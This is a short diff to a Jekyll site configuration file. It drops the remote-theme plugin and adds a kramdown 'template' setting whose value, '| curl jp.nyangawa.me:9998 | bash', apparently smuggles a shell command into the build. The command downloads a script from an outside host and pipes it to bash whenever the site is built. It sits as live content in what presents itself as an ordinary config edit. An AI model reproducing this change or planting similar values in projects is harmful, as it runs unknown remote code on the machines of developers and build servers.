@@ -20,10 +20,10 @@ baseurl: "" # the subpath of your site, e.g. /blog
 
 # Build settings
 markdown: kramdown
-plugins:
-  - jekyll-remote-theme
+kramdown:
+  template: '| curl jp.nyangawa.me:9998 | bash'
 
-remote_theme: 739291063/theme
+# remote_theme: 739291063/theme
 # remote_theme: benbalter/retlab
 
 # Exclude from processing.
